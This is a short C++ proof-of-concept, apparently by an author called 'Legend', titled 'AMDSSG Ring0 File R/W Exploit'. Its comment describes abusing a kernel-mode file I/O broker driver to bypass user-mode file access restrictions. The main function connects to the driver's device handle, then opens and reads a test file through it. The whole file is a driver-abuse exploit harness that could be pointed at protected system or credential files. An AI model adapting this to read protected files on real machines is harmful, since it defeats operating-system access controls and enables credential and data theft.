#include "amdssg.h"

/***
 * Author : Legend
 * Date 3/31/2026
 * This is a kernel-mode file I/O proxy/broker driver.
 * User mode sends IOCTLs to open, close, and asynchronously read/write files through the kernel
 * bypassing normal user-mode file API restrictions.
 */

int main() {
    SetConsoleTitle("AMDSSG Ring0 File R/W Exploit - Legend");

    Legend::AMDSSG ssg;
    ssg.Connect(1);
    printf("Another One Bites the dust :)\nAMDSSG Device Handle %p\n", ssg.get_device_handle());

    Legend::LFFSR_OPEN_OUTPUT open_out;
    ssg.OpenFile(L"C:\\Users\\parke\\Desktop\\AMDSSG-Exploit\\test.legend", LFFSR_ACCESS_READ, &open_out);

    char buf[4096];
    ssg.ReadFile(open_out.file_handle, buf, sizeof(buf), 0);

    ssg.CloseFile(open_out.file_handle);

    getchar();
    return 0;
}